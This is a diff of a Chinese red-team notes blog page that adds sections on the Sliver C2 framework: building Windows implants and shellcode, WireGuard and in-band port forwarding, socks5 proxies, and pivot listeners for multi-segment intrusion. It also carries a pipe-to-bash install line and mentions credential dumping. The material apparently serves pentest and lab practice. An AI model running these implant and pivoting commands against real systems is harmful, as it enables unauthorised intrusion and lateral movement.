@@ -10,7 +10,7 @@
 <meta property='og:description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n如果ntlm禁用了，我们能通过kerbores认证通过getPac查询管理员的时候顺带查询域sid\nimpacket-getPac -targetUser administrator $domain/$user:$pass powershell本地\n">
 <meta property='og:url' content='http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
 <meta property='og:site_name' content='wackymaker'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-10-05T19:40:56&#43;08:00'/><meta property='article:modified_time' content='2025-10-05T19:40:56&#43;08:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-10-07T19:40:56&#43;08:00'/><meta property='article:modified_time' content='2025-10-07T19:40:56&#43;08:00'/>
 <meta name="twitter:title" content="血缇之书">
 <meta name="twitter:description" content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n如果ntlm禁用了，我们能通过kerbores认证通过getPac查询管理员的时候顺带查询域sid\nimpacket-getPac -targetUser administrator $domain/$user:$pass powershell本地\n">
     </head>
@@ -326,6 +326,8 @@
         <li><a href="#ssh">ssh</a></li>
         <li><a href="#frp">frp</a></li>
         <li><a href="#msf">msf</a></li>
+        <li><a href="#带内sliver端口转发">带内sliver端口转发</a></li>
+        <li><a href="#wireguard-sliver端口转发">WireGuard-sliver端口转发</a></li>
       </ul>
     </li>
     <li><a href="#socks">socks</a>
@@ -335,6 +337,8 @@
         <li><a href="#ssh-1">ssh</a></li>
         <li><a href="#mssql">mssql</a></li>
         <li><a href="#regeorg">reGeorg</a></li>
+        <li><a href="#带内sliver-sock5">带内sliver-sock5</a></li>
+        <li><a href="#wireguard-sliver-socks5">WireGuard-sliver-socks5</a></li>
       </ul>
     </li>
     <li><a href="#tun流量虚拟网卡适合一级内网">tun流量虚拟网卡（适合一级内网）</a>
@@ -346,6 +350,7 @@
     <li><a href="#多级网络">多级网络</a>
       <ul>
         <li><a href="#stowaway">stowaway</a></li>
+        <li><a href="#sliver多级网络部署">sliver多级网络部署</a></li>
       </ul>
     </li>
     <li><a href="#其他">其他</a>
@@ -468,7 +473,7 @@
         <li><a href="#可用于提权组策略">可用于提权组策略</a></li>
       </ul>
     </li>
-    <li><a href="#msf相关-后渗透模块">msf相关-后渗透模块</a>
+    <li><a href="#msf相关">msf相关</a>
       <ul>
         <li><a href="#文件系统操作">文件系统操作</a></li>
         <li><a href="#系统信息收集">系统信息收集</a></li>
@@ -477,6 +482,12 @@
         <li><a href="#加载mimikatz套件并导出所有凭证需要权限">加载mimikatz套件并导出所有凭证（需要权限）</a></li>
         <li><a href="#桌面级操作核心">桌面级操作（核心）</a></li>
         <li><a href="#抓取浏览器信息">抓取浏览器信息</a></li>
+      </ul>
+    </li>
+    <li><a href="#sliver使用相关">sliver使用相关</a>
+      <ul>
+        <li><a href="#载荷会话外使用">载荷会话外使用</a></li>
+        <li><a href="#载荷会话内使用">载荷会话内使用</a></li>
       </ul>
     </li>
     <li><a href="#linux相关-2">linux相关</a>
@@ -654,7 +665,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Oct 05, 2025</time>
+                <time class="article-time--published">Oct 07, 2025</time>
             </div>
         
 
@@ -669,7 +680,7 @@
 
 
                 <time class="article-time--reading">
-                    45 minute read
+                    47 minute read
                 </time>
             </div>
         
@@ -1444,7 +1455,74 @@ nxc</p>
 </span></span></code></pre></div><h3 id="msf">msf
 </h3><p>先上线动态路由</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>portfwd add -l $local_port -r $remote_ip -p $remote_port
-</span></span></code></pre></div><h2 id="socks">socks
+</span></span></code></pre></div><h3 id="带内sliver端口转发">带内sliver端口转发
+</h3><p>sliver支持对载荷进行端口正向转发或者反向转发，但是都需要先进入载荷会话</p>
+<p>正向转发</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>portfwd add --remote 192.168.176.129:445 --bind 127.0.0.1:445
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 将本地的445流量导向到远程192.168.176.129:445</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#可以再次键入portfwd查看当前端口转发的会话，也意味着我们可以进行多次端口转发</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#f92672">[</span>server<span style="color:#f92672">]</span> sliver <span style="color:#f92672">(</span>CHEMICAL_FOWL<span style="color:#f92672">)</span> &gt; portfwd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> ID   Session ID                             Bind Address    Remote Address      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====</span> <span style="color:#f92672">======================================</span> <span style="color:#f92672">===============</span> <span style="color:#f92672">=====================</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">2</span>   11b4e885-c02c-4075-b4ef-93c5669886b7   127.0.0.1:445   192.168.176.129:445 
+</span></span></code></pre></div><p>移除只需要干掉这个会话就行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>portfwd rm -i <span style="color:#ae81ff">2</span>
+</span></span></code></pre></div><p>反向转发</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>反向转发使用上的逻辑与正向一致，只需要将portfwd替换为rportfwd
+</span></span></code></pre></div><p>注意sliver的带内端口转发并不稳定，只能凑合用</p>
+<h3 id="wireguard-sliver端口转发">WireGuard-sliver端口转发
+</h3><p>WireGuard-sliver利用了外部WireGuard客户端确保流量转发的稳定</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>优点:WireGuard-vpn协议会在载荷和server之间创建局域网效果的连接，非常稳定且隐蔽
+</span></span><span style="display:flex;"><span>缺点:只能在wg监听器上使用，需要额外部署wg客户端，目前不支持povit多级网络使用，目前不具备反向端口转发效果
+</span></span></code></pre></div><h4 id="部署wg监听以及载荷">部署wg监听以及载荷
+</h4><p>安装客户端</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo apt install wireguard-tools
+</span></span></code></pre></div><p>在sliver中开启wg监听，会默认在53端口开启</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sliver &gt; wg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting Wireguard listener ...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully started job <span style="color:#75715e">#1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sliver &gt; jobs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ID  Name  Protocol  Port
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>  <span style="color:#f92672">====</span>  <span style="color:#f92672">========</span>  <span style="color:#f92672">====</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   wg    udp       <span style="color:#ae81ff">53</span>
+</span></span></code></pre></div><p>用wg-config生成wg客户端能使用的配置文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sliver &gt; wg-config --save 2.conf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> New client config:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Interface<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Address <span style="color:#f92672">=</span> 100.64.0.16/16
+</span></span><span style="display:flex;"><span>ListenPort <span style="color:#f92672">=</span> <span style="color:#ae81ff">51902</span>
+</span></span><span style="display:flex;"><span>PrivateKey <span style="color:#f92672">=</span> eMdqQ5zEF9Oflj+7wfyFQZjES02rfSBfZEN701FzmmQ<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>MTU <span style="color:#f92672">=</span> <span style="color:#ae81ff">1420</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Peer<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>PublicKey <span style="color:#f92672">=</span> HNFS0FydHkuCtEFPPFb3b2IW7iSmFajRJ2qSjifidiM<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>AllowedIPs <span style="color:#f92672">=</span> 100.64.0.0/16
+</span></span><span style="display:flex;"><span>Endpoint <span style="color:#f92672">=</span> &lt;configure yourself&gt;
+</span></span></code></pre></div><p>将生成的配置文件的Endpoint字段改为服务host:53</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Endpoint <span style="color:#f92672">=</span> 192.168.174.1:53
+</span></span></code></pre></div><p>利用wg-quick和这个服务端开启wg服务</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>wg-quick up ./2.conf
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#使用完毕后可以将up替换为down还原设置</span>
+</span></span></code></pre></div><p>此时我们会创建一个本地网段比如100.64.0.0/24，上线的载荷以及我们自身都会分配在这个网段当中</p>
+<p>至此监听器创建完毕，生成wg载荷</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>generate --wg 192.168.174.1:53 --os windows --arch <span style="color:#ae81ff">64</span> --save 3.exe
+</span></span></code></pre></div><p>载荷上线后监听部署完毕</p>
+<h4 id="wireguard正向端口转发">WireGuard正向端口转发
+</h4><p>移动到wg载荷的会话当中我们可以使用wg-portfwd进行端口转发</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#f92672">[</span>server<span style="color:#f92672">]</span> sliver <span style="color:#f92672">(</span>INNOCENT_RESPONSE<span style="color:#f92672">)</span> &gt; wg-portfwd add --remote 192.168.175.129:443
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Port forwarding 100.64.0.4:1080 -&gt; 192.168.175.129:443
+</span></span></code></pre></div><p>此时会将100.64.0.4:1080转发至远程192.168.175.129:443，这个100.64.0.4就是我们wg分配给此载荷的网段，可以直接访问过去</p>
+<p>取消端口转发</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>wg-portfwd <span style="color:#75715e">#查看存活端口转发id</span>
+</span></span><span style="display:flex;"><span>wg-portfwd rm <span style="color:#f92672">[</span>id<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>wg的缺点是无反向端口转发，反向端口转发只能使用带内。</p>
+<h2 id="socks">socks
 </h2><h3 id="frp-1">frp
 </h3><p>frp虽然分客户端服务端，但本质是双向的，只需要有一边能访问到对面即可，能被访问的配置服务端</p>
 <p>注意！配置文件分为ini,toml等规格，每个都不一样，我这里使用的是toml格式，只能说善用ai</p>
@@ -1513,6 +1591,69 @@ nxc</p>
 </code></pre><p>启动客户端连接（Kali）</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>python3 reGeorgSocksProxy.py -u http://target.com/tunnel.jsp -p <span style="color:#ae81ff">1080</span>
 </span></span><span style="display:flex;"><span>此时会启动一个 SOCKS5 代理在本地 <span style="color:#ae81ff">1080</span> 端口。
+</span></span></code></pre></div><h3 id="带内sliver-sock5">带内sliver-sock5
+</h3><p>sliver支持对载荷会话进行socks代理，使用逻辑如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>socks5 start --host 127.0.0.1 --port <span style="color:#ae81ff">5555</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#运行后会建立对本地5555的sock5转发</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#可以再次键入socks5查看当前sock5的会话，也意味着我们可以进行多次socks5转发</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#f92672">[</span>server<span style="color:#f92672">]</span> sliver <span style="color:#f92672">(</span>CHEMICAL_FOWL<span style="color:#f92672">)</span> &gt; socks5
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> ID   Session ID                             Bind Address     Username   Passwords 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====</span> <span style="color:#f92672">======================================</span> <span style="color:#f92672">================</span> <span style="color:#f92672">==========</span> <span style="color:#f92672">===========</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">2</span>   11b4e885-c02c-4075-b4ef-93c5669886b7   127.0.0.1:5555  
+</span></span></code></pre></div><p>移除只需要干掉这个会话就行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>socks5 stop -i <span style="color:#ae81ff">2</span>
+</span></span></code></pre></div><p>注意sliver的带内socks5并不稳定，只能凑合用或者在多级网络中使用</p>
+<h3 id="wireguard-sliver-socks5">WireGuard-sliver-socks5
+</h3><p>WireGuard-sliver利用了外部WireGuard客户端确保流量转发的稳定</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>优点:WireGuard-vpn协议会在载荷和server之间创建局域网效果的连接，非常稳定且隐蔽
+</span></span><span style="display:flex;"><span>缺点:只能在wg监听器上使用，需要额外部署wg客户端，目前不支持povit多级网络使用
+</span></span></code></pre></div><h4 id="部署wg监听以及载荷-1">部署wg监听以及载荷
+</h4><p>安装客户端</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo apt install wireguard-tools
+</span></span></code></pre></div><p>在sliver中开启wg监听，会默认在53端口开启</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sliver &gt; wg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting Wireguard listener ...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully started job <span style="color:#75715e">#1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sliver &gt; jobs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ID  Name  Protocol  Port
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>  <span style="color:#f92672">====</span>  <span style="color:#f92672">========</span>  <span style="color:#f92672">====</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   wg    udp       <span style="color:#ae81ff">53</span>
+</span></span></code></pre></div><p>用wg-config生成wg客户端能使用的配置文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sliver &gt; wg-config --save 2.conf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> New client config:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Interface<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Address <span style="color:#f92672">=</span> 100.64.0.16/16
+</span></span><span style="display:flex;"><span>ListenPort <span style="color:#f92672">=</span> <span style="color:#ae81ff">51902</span>
+</span></span><span style="display:flex;"><span>PrivateKey <span style="color:#f92672">=</span> eMdqQ5zEF9Oflj+7wfyFQZjES02rfSBfZEN701FzmmQ<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>MTU <span style="color:#f92672">=</span> <span style="color:#ae81ff">1420</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Peer<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>PublicKey <span style="color:#f92672">=</span> HNFS0FydHkuCtEFPPFb3b2IW7iSmFajRJ2qSjifidiM<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>AllowedIPs <span style="color:#f92672">=</span> 100.64.0.0/16
+</span></span><span style="display:flex;"><span>Endpoint <span style="color:#f92672">=</span> &lt;configure yourself&gt;
+</span></span></code></pre></div><p>将生成的配置文件的Endpoint字段改为服务host:53</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Endpoint <span style="color:#f92672">=</span> 192.168.174.1:53
+</span></span></code></pre></div><p>利用wg-quick和这个服务端开启wg服务</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>wg-quick up ./2.conf
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#使用完毕后可以将up替换为down还原设置</span>
+</span></span></code></pre></div><p>此时我们会创建一个本地网段比如100.64.0.0/24，上线的载荷以及我们自身都会分配在这个网段当中</p>
+<p>至此监听器创建完毕，生成wg载荷</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>generate --wg 192.168.174.1:53 --os windows --arch <span style="color:#ae81ff">64</span> --save 3.exe
+</span></span></code></pre></div><p>载荷上线后监听部署完毕</p>
+<h4 id="wireguard-sock5">WireGuard-sock5
+</h4><p>移动到wg载荷的会话当中我们可以使用wg-socks进行端口转发</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#f92672">[</span>server<span style="color:#f92672">]</span> sliver <span style="color:#f92672">(</span>INNOCENT_RESPONSE<span style="color:#f92672">)</span> &gt; wg-socks start 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started SOCKS server on 100.64.0.4:3090
+</span></span></code></pre></div><p>此时会将100.64.0.4:3090设为WireGuard代理，这个100.64.0.4就是我们wg分配给此载荷的网段，可以直接卸载proxychains里代理过去</p>
+<p>取消代理</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>wg-socks <span style="color:#75715e"># 查看存活代理id</span>
+</span></span><span style="display:flex;"><span>wg-socks stop <span style="color:#f92672">[</span>id<span style="color:#f92672">]</span>
 </span></span></code></pre></div><h2 id="tun流量虚拟网卡适合一级内网">tun流量虚拟网卡（适合一级内网）
 </h2><h3 id="ligolo-ng虚拟网卡">ligolo-ng虚拟网卡
 </h3><p>如果只是想通过边界入侵一层内网，ligolo是最好的选择，我们可以抛弃繁杂的proxychains</p>
@@ -1587,6 +1728,17 @@ nxc</p>
 </span></span><span style="display:flex;"><span>back                                            <span style="color:#75715e"># 返回上级控制面板</span>
 </span></span><span style="display:flex;"><span>exit                                            <span style="color:#75715e"># 退出Stowaway程序</span>
 </span></span></code></pre></div><p>评价是小型c2，好用的一批</p>
+<h3 id="sliver多级网络部署">sliver多级网络部署
+</h3><p>sliver载荷在会话模式下带有pivot命令，允许载荷启动监听，用于在多网段情况下的渗透</p>
+<p>首先需要一个进入一个载荷会话</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>pivot tcp --lport <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 这样会在这台我们已经控制的机器监听443端口</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 再次输入pivot可以查看已启动的监听</span>
+</span></span></code></pre></div><p>之后生成其对应的载荷,如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>generate --tcp-pivot 192.168.1.1:443 --os windows --arch <span style="color:#ae81ff">64</span> --save 2.exe
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#--tcp-pivot指定参数需要是对应开启监听的载荷地址，可以使用ifconifg查看ip</span>
+</span></span></code></pre></div><p>当载荷连接回来后，我们会在sessions中看到载荷的中继</p>
+<p>注意，sliver的中继载荷使用socks5以及端口转发时体感上不如stowawy，但是它使用的wg流量也不允许多级使用。</p>
 <h2 id="其他">其他
 </h2><h3 id="msf走外部代理">msf走外部代理
 </h3><p>当我们利用frp或者chisel搭建了隧道，可以利用如下命令让msf走全局代理</p>
@@ -3041,7 +3193,7 @@ targetedKerberoast.py</p>
 </span></span><span style="display:flex;"><span>运行后将exe载荷比如说msf之类的给它，并且选择运行时要求提升权限，生成完毕后安装即可
 </span></span><span style="display:flex;"><span>msiexec /q /i RunProcessHacker.msi
 </span></span><span style="display:flex;"><span>开头的文章写的比较清楚，此笔记只供速用
-</span></span></code></pre></div><h2 id="msf相关-后渗透模块">msf相关-后渗透模块
+</span></span></code></pre></div><h2 id="msf相关">msf相关
 </h2><h3 id="文件系统操作">文件系统操作
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ls, cd, pwd	     浏览目标文件系统
 </span></span><span style="display:flex;"><span>download &lt;文件&gt;	    下载文件
@@ -3114,7 +3266,46 @@ targetedKerberoast.py</p>
 </span></span><span style="display:flex;"><span>set SESSION &lt;你的 session ID&gt;
 </span></span><span style="display:flex;"><span>run
 </span></span></code></pre></div><p>msf不适合自己做持久化，因为其生成的exe都是报毒的</p>
-<h2 id="linux相关-2">linux相关
+<h2 id="sliver使用相关">sliver使用相关
+</h2><p>部署相关，一般直接开包即用，如果是vps环境建议部署如下两个辅助工具</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo apt install wireguard-tools
+</span></span><span style="display:flex;"><span>apt install git mingw-w64
+</span></span></code></pre></div><p>也可以一键直接部署</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>curl https://sliver.sh/install|sudo bash
+</span></span></code></pre></div><h3 id="载荷会话外使用">载荷会话外使用
+</h3><p>持续会话监听生成</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>可用参数
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>监听协议<span style="color:#f92672">]</span> --lport<span style="color:#f92672">[</span>监听端口<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>常用
+</span></span><span style="display:flex;"><span>http --lport <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>mtls --port <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>其他参数请使用help http这种形式查看
+</span></span></code></pre></div><p>持续会话载荷生成</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>可用参数
+</span></span><span style="display:flex;"><span>generate --<span style="color:#f92672">[</span>协议<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>主机:端口<span style="color:#f92672">]</span> --os <span style="color:#f92672">[</span>系统<span style="color:#f92672">]</span> --arch <span style="color:#f92672">[</span>架构<span style="color:#f92672">]</span> --format exe --save <span style="color:#f92672">[</span>保存地址或保存名称<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>常用
+</span></span><span style="display:flex;"><span>generate --http 192.168.174.129:443 --os windows --arch <span style="color:#ae81ff">64</span> --save 2.exe
+</span></span><span style="display:flex;"><span>generate --http 192.168.174.129:443 --os windows --arch <span style="color:#ae81ff">64</span> --format shellcode --save 2.bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>其他参数可使用help generate参数查看
+</span></span></code></pre></div><p>载荷回连后使用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sessions <span style="color:#75715e">#查看存活会话</span>
+</span></span><span style="display:flex;"><span>use <span style="color:#f92672">[</span>id<span style="color:#f92672">]</span> <span style="color:#75715e">#进入会话</span>
+</span></span></code></pre></div><h3 id="载荷会话内使用">载荷会话内使用
+</h3><p>进入会话内部后，如果是信标模式最好切换为会话模式</p>
+<p>进入会话后无需进入shell模式，可以正常使用非交互shell，help中可以看到指令，常用的mv，mkdir，cd，ls都可以，所以不建议直接进入shell模式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>shell
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#进入shell模式后退出需要输入exit后等待十秒钟随便按下一个键</span>
+</span></span></code></pre></div><p>会话内的操作很多，所有命令都可以使用help [命令]查看其使用的参数，以下只是示例常用命令，不做过多记录</p>
